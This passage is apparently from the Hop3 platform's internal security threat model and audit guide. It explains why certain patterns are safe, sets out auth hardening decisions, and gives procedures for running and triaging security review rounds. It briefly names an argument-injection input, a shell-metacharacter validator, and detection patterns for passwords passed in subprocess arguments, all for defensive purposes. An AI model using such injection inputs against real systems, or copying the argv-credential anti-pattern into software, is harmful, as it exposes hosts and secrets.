**Why acceptable, for now:** the boundary §3.4.5 defends is *raw database rows / a database backup → plaintext*, and that boundary still holds — the secrets files are not in the database and not in a `pg_dump`. What it never defended is a reader on the host with the `hop3` uid, and encrypting these files would not add that: `/etc/hop3/secret-key` is 0640 `root:hop3`, so anything running as `hop3` can read `HOP3_SECRET_KEY` and decrypt the rows anyway. Encryption here would be ceremony over a key the same reader holds.

**Boundary:** *`hop3` uid → every addon credential on the host.* That is a real exposure and it is the one the model already names: apps share the `hop3` account, so code execution in any app reads every app's addon passwords. It is [ADR 055](../adrs/055-app-runtime-uid-separation.md)'s exposure, not a second one, and per-app UID separation is what closes it. Encrypting this store is worth revisiting **after** ADR 055 lands, when the reader and the key holder stop being the same principal; until then it would buy nothing and read as protection.

### 3.5 Static literal lists that look like injection sinks

#### 3.5.1 OS package lists

**Files:** `packages/hop3-server/src/hop3/plugins/oses/{arch,bsd,debian_family,macos,redhat_family}.py`
**Pattern:** `subprocess.run([pkg_manager, "install", "-y", *PACKAGES])`. Each `PACKAGES` list is a module-level static literal.

**Why safe:** **the lists must remain static literals.** Each declaration carries a `# SECURITY: must remain a static literal: see arch.PACKAGES for why` comment. `BaseOSStrategy._validate_package_names` runs at every `ensure_packages` call as a regex-shape check (rejects shell metacharacters and leading `-`, which would otherwise allow argument injection like `--reinstall`). Both controls together: static source + shape validator at sink.

**Boundary:** *App deployer → operator/host.* If `PACKAGES` ever became user-extensible, both halves of the contract would have to change.

#### 3.5.2 hop3-rootd allow-listed binaries

**File:** `packages/hop3-rootd/src/hop3_rootd/exec.py` (`ALLOWED_BINARIES`)
**Pattern:** the rootd daemon will only `exec` binaries on a hard-coded allow-list of absolute paths.

**Why safe:** a confused-deputy bug elsewhere in rootd cannot escalate by passing an attacker-named binary. The list is a frozenset of literal absolute paths.

**Boundary:** *hop3 user → root.* This is rootd's main defensive control, alongside the per-op validator framework.

### 3.6 Things that look like info leaks but aren't

#### 3.6.1 Catalog icons, public catalog endpoints

The app catalog (titles, descriptions, icons) is **public by design**. No-auth GET on `/dashboard/catalog/icons/<id>` is intentional. Rate-limiting against enumeration is a separate operational concern.

#### 3.6.2 Truncated `RepositoryError` strings via RPC

`packages/hop3-server/src/hop3/repositories/repository_errors.py::extract_repository_error_reason` returns the underlying SQLAlchemy error message (truncated). SQLAlchemy errors can include partial query fragments and column names, useful for debugging but considered low-impact info disclosure given the authenticated-admin trust posture. A redaction pass is queued as a defense-in-depth follow-up; not a vulnerability per the trust model.

#### 3.6.3 Self-signed certificates with 1-year validity

Two self-signed cert paths exist; both use 365-day validity. `packages/hop3-server/src/hop3/platform/certificates.py::generate_self_signed` covers the per-app cert path (RSA-4096); `packages/hop3-installer/src/hop3_installer/server_installer/ssl.py` (driven by `SSL_CERT_VALIDITY_DAYS` in `constants.py`) covers the system-level cert path used during install. Both fall back to self-signed only when ACME is unavailable; ACME-via-certbot is the documented production path. Documented in [ADR 011](../adrs/011-encryption.md).

### 3.7 Cookie-authenticated routes and CSRF

Dashboard web auth is a signed JWT in an httponly `hop3_auth` cookie (`packages/hop3-server/src/hop3/server/security/web_auth.py`), `samesite=lax`. hop3-server has **no CSRF middleware** (it never did: the prior server-side-session design had the same posture). `lax` blocks the cookie on cross-site POSTs but sends it on cross-site GETs, so the whole argument rests on one property: **every state-changing route is a POST.**

That property is now enforced rather than re-verified by hand. `tests/b_integration/server/test_auth_transport_and_logout.py` walks the route map and fails on any `GET` whose path names a mutation, so a new mutating `@get` breaks the build instead of quietly invalidating the reasoning.

`GET /auth/logout` was the exception, and had been since May 2026: a link any page could embed to force a logout. It is now a `@post` reached from a form in `base.html`. Low impact on its own (idempotent, no data loss); it mattered because an invariant with a known exception is not an invariant.

The class-level fix (a CSRF/double-submit token for every cookie-authenticated mutating route) is a separate platform-hardening item. Note: the web cookie token and the CLI bearer token are the same credential (one credential, two transports); a leaked dashboard cookie is a full programmatic admin token. Future hardening could mint web tokens with a distinct scope.

#### 3.7.1 The `Secure` cookie must not meet plain HTTP

`auth_cookie` sets `secure=not HOP3_DEBUG`. Over `http://host:8000` (no admin domain, no TLS) the browser accepted the `Set-Cookie` and never sent it back, so login "succeeded", the dashboard found no credential, and bounced to the login page. An endless loop, no error, nothing in any log: precisely the silent failure the project's fail-loud rule forbids.

Both routes that can issue the cookie (the login form and magic-link redemption) now call `AuthController._refuse_login` **before** touching the credential, which refuses the request and names the cause. Three details are essential:

- **`request_is_secure` (`server/security/proxy_headers.py`) reads `X-Forwarded-Proto` only from a trusted peer**, on the same terms and for the same reason as `client_ip`; otherwise any client could suppress the refusal with a header. An untrusted claim degrades to "not secure", which is the safe direction.
- **The check precedes `validate_magic_token`**, which consumes the token. Refusing afterwards would burn a single-use link to reach a login that still could not work.
- **`HOP3_DEBUG` is half the predicate.** In debug the cookie is not `Secure`, plain HTTP genuinely works, and local development is unaffected. The refusal fires only on the combination that cannot work.

#### 3.7.2 When a magic link is spent

The bullet above says the transport check precedes consumption. The checks *after* consumption go the other way, and the pair only looks inconsistent until the rule behind it is stated.

`validate_magic_token` revokes the token before the caller has established that the user exists and is active (`server/controllers/auth.py`), so a link presented for a deleted or disabled account is spent without granting anything. **This is the decided behaviour** (F6, decided 2026-08-02; raised in [report-2026-07-29.md](report-2026-07-29.md)), and the rule that decides both cases is:

> Refuse before consuming when the obstacle is one the holder can remove within the token's life; consume when it is not.

Plain HTTP is removable: reach the server over HTTPS and the same link works, so burning it would strand an operator who has no second link. A deleted account is not removable in five minutes by the person holding the link, so keeping the token alive buys nothing and leaves a credential that survives its first presentation — replayable across exactly the state change (an account re-created or re-enabled) that makes replay worth attempting.

Pinned by `tests/a_unit/server/security/test_tokens.py::test_validate_magic_token_is_spent_on_presentation`, because the ordering is invisible at the call site: moving the user lookup three lines earlier would silently reverse the decision.

### 3.8 Auth rate limiting: one budget, two transports, single worker

`server/security/rate_limit.py` is an in-memory sliding window. Three properties of it are essential, and each was a defect first.

**One instance covers every path that verifies a password.** `AUTH_RATE_LIMITER` and `client_ip()` live in `rate_limit.py`, not in a controller, because credential verification is reachable over two transports: the web form (`POST /auth/login`) and JSON-RPC (`auth get-token`). Only the web form was throttled until [report-2026-07-29.md](report-2026-07-29.md) F1; an attacker who picked the other transport guessed passwords at bcrypt speed, roughly 100× the intended ceiling. A second `RateLimiter(5, 60)` instance would mean a second budget and no fix at all, so **the shared instance is the control**. If you add a third transport, import that instance; do not construct one.

**A pre-auth command declares its own throttling.** `Command.rate_limited` (default `False`) is read by the RPC dispatcher before dispatch. Any command that both skips authentication and verifies a credential must set it. `tests/a_unit/commands/test_rate_limited_commands.py` fails when a new `requires_auth = False` command appears that neither sets the flag nor joins a small reviewed allow-list of commands that verify nothing; the gap is caught at review time rather than in the next audit.

**The limit is per worker process**, and the module docstring says so. There is no bypass today because the server runs a single worker: `server/cli/serve.py` starts **Granian** (not Uvicorn: reviewers keep assuming otherwise) with `WORKERS = 1` pinned explicitly, and `check_worker_count` refuses the unsafe pairing at startup, naming the Redis-backed replacement. `LIMITER_STATE_IS_SHARED` is the flag to flip in the same change that backs the limiter with shared storage.

The IP-keying half of this surface is sound and was fixed in an earlier round: `client_ip` honours `X-Forwarded-For` only when the TCP peer is a trusted proxy, and takes the *rightmost* entry (the one our proxy appended) rather than the leftmost, which a client can pre-seed.

### 3.9 Login failures are deliberately indistinguishable

Every failure mode of `auth get-token` and `POST /auth/login` (unknown username, disabled account, wrong password) returns the identical string `"Invalid username or password"`, and takes bcrypt's time to do it. `orm/security.py::burn_password_check` verifies against a throwaway hash on the branches where no real hash is available, so "no such user" cannot be told from "wrong password" by response time either.

This looks like unhelpful error reporting and is not: a distinct "account is disabled" reply enumerates which accounts exist and which are merely locked, which is the reconnaissance step in front of a password-guessing campaign ([report-2026-07-29.md](report-2026-07-29.md) F2, CWE-204). `burn_password_check` is deliberately expensive, so it is a DoS lever unless the caller is rate limited; §3.8 is what makes it safe, and the two must not be separated.

**Boundary:** *Unauthenticated → authenticated.* If you are about to "improve" one of these messages, don't.

### 3.10 Invariant 2 is enforced, not just documented

`tests/a_unit/test_no_credentials_in_argv.py` scans `packages/*/src` for credentials formatted into subprocess arguments (`-p{password}`, `--password={...}`, `redis-cli -a <secret>`) across every package, because the drift this catches is always one call site fixed and its twin in another package left alone (§2.2). The threat model previously said of this rule: "Nothing enforces it. There is no test and no lint rule." Now something does.

Two design notes for whoever edits it. The patterns anchor on the quote that opens the string (`"-p{`, not `-p{`), which is what keeps the scan off the `# SECURITY:` comments at each sink: every one of them names the anti-pattern it avoids, and a test that fired on those would be firing on the documentation that exists because the rule is taken seriously. And a companion test plants a known-bad line and asserts the patterns match it, because a scan that matches nothing is indistinguishable from a scan that passes.

---

## 4. Conducting a review

This section is the procedure for *running* a review round, human or LLM-driven. It is written from what the 2026-05 and 2026-07 rounds actually cost us; each rule below exists because skipping it wasted a measurable amount of time.

### 4.1 Brief the reviewer with this document

Prepend §1–§3 to the reviewer's context before it reads a line of source. The first round after this document existed, the reviewing model began self-classifying findings as "intentional and documented in §X.Y", and the recurring noise from earlier rounds (every shell string re-flagged, every f-string-into-SQL re-flagged) largely disappeared. An unbriefed reviewer will rediscover §3 from scratch and report it as findings.

State the threat model for local-only components explicitly and separately, because it is the single most common source of invalid findings: `hop3-installer`, `hop3-cli` and `hop3-tui` run on the operator's or developer's own machine, with that user's own privileges, on input that user typed. No boundary is crossed there. A reviewer not told this will produce a report full of "command injection via `--branch`" and "missing authentication on the CLI".

### 4.2 Prefer whole-repo scope

Partitioning a review by package is efficient but blind to exactly the class of finding that matters most. The 2026-07 round ran four package-scoped audits that each concluded "clean" while a systemic authorization gap sat between the RPC dispatcher and the command classes, visible only to the whole-repo run. Boundary-crossing bugs live *between* components; scope the review so it can see across them.

### 4.3 Demand evidence proportional to the claim

A finding needs a trace from a named entry point to a named sink, and (for anything above informational) something that runs. The 2026-07 installer report shipped seven findings with an "Exploit Test: PASS" column where the tests were of this shape:

```python
source = inspect.getsource(install_package)
assert "config.branch" in source   # "this indicates the vulnerability"
```

No process spawned, no payload executed. Grep dressed as proof. If a finding cannot be demonstrated, it may still be reported as a structural concern, marked unverified. It must not carry a severity as though it had been shown.

### 4.4 Re-verify against the current commit before writing the report

Record the exact commit audited, and diff against `HEAD` before publishing. In the 2026-07 round, five of eleven installer findings were fixed within an hour of the run finishing; the report asserted them for another week. A stale report is worse than no report, because it spends reviewer attention on work already done.

### 4.5 Sweep sister sites before declaring a fix done

See §2.2. In the 0.5.0.dev3 round, *all three* REAL findings were sister sites of patterns already fixed elsewhere. Budget for the sweep as part of the fix, not as a follow-up.

### 4.6 Run rounds in cadence, not as one-shot audits

Rounds compound: each one both closes issues and exposes the next layer. In May, the whole-codebase round found a pre-auth admin takeover that a preceding rootd-scoped review had no way to see, and a later round caught doc drift a previous round had introduced. One thorough audit per release is worth less than three cheaper rounds spaced across it.

### 4.7 Triage vocabulary

Sort every candidate into one of four buckets before fixing anything, and keep the counts in the report:

- **REAL**: crosses a boundary from §1.2, exploitable as described. Fix this round.
- **REAL-LOW**: crosses a boundary, but impact is bounded (info disclosure to an already-authenticated caller, DoS requiring an authenticated tight loop, defense-in-depth gap behind a working control). Fix opportunistically; don't let it displace REAL.
- **Threat-model misaligned**: the taint flow crosses no boundary in §1.2. Retract, or argue explicitly with §1. If the same misalignment recurs across rounds, add an `# AUDIT:` marker at the site (§2.1); re-litigating wastes review time.
- **Structural**: the safety of the code rests on per-site discipline that a future edit will silently break, without a working exploit today. Worth fixing when the fix makes the invariant hold by construction rather than by convention.

### 4.8 Record the round, then keep it current

Write `notes/security/report-YYYY-MM-DD.md`: what was run, what was found, what was done, what remains open with an owner or a decision needed. Update §3 of this document in the same change whenever a round moves a boundary or adds an audited pattern; doc drift is a real bug, and §3 going stale is what causes the next round's false positives.

**A report is not finished when it is published.** When a finding it raised gets fixed (this round, next release, a year later) go back and say so in that report, in the same change as the fix: what was done, and anything the fix turned out to involve that the finding did not anticipate. The report tracks a finding's whole life.

This costs a minute and pays for itself twice. A reviewer opening an old report is deciding whether a surface is worth re-examining, and a stale "open" sends them to re-triage something already closed; the 2026-07-29 round spent effort re-verifying four July findings for exactly this reason. And the interval itself is evidence: two gaps correctly diagnosed in May 2026, with the fix spelled out in the report, sat open for fifteen months. Nobody decided to defer them. That is visible only if the report says when they closed.

Findings that outlive a round belong in the standing backlog ([backlog-2026-08-01.md](backlog-2026-08-01.md)) as well, so "what is left" is answerable without reading every report.

---

## 5. Filing a real finding

If you have a finding that doesn't match any audited pattern above, or you believe an audited pattern's reasoning is wrong:

1. **Re-read §1.1 (actors) and §1.2 (boundaries).** If the taint flow doesn't cross a boundary listed there, the finding is most likely "threat-model misaligned". Write up the boundary argument and either retract or disagree explicitly with §1.
2. **Search source for the corresponding `# SECURITY:` or `# AUDIT:` comment.** If one exists, the rationale is local. If the rationale doesn't actually defend the flow you found, that's a real finding.
3. **Classify it** against §4.7 (REAL / REAL-LOW / threat-model misaligned / structural), and hold it to the evidence bar in §4.3.
4. **Write it up.** For a confirmed exploitable issue, report it privately to **security@abilian.com** per the [security policy](../../docs/src/reference/policies/security-policy.md), not as a public issue. For a reasoning gap (an audited pattern whose comment is wrong or stale), open a regular issue or PR updating §3.

---

## 6. What this document is *not*

- It is not a complete catalogue of every defensive control in the codebase. It documents the patterns that are non-obvious: the surface that looks risky and isn't, plus the interlocks that do the most work. Routine controls (parameterised queries that are obviously parameterised, password hashing via established libraries, JWT verification) are not enumerated here.
- It is not the public security policy. The disclosure channel, acknowledgement commitment and safe-harbour terms live in [`docs/src/reference/policies/security-policy.md`](../../docs/src/reference/policies/security-policy.md). A supported-versions matrix is still missing from both documents.
- It is not a commitment to a fixed threat model. Hop3's posture evolves as the platform grows; bumps in scope (multi-node, hosted-mode, federated identity) will move boundaries and invalidate audited patterns. Update this document in the same PR that moves a boundary, not in a separate cleanup pass.
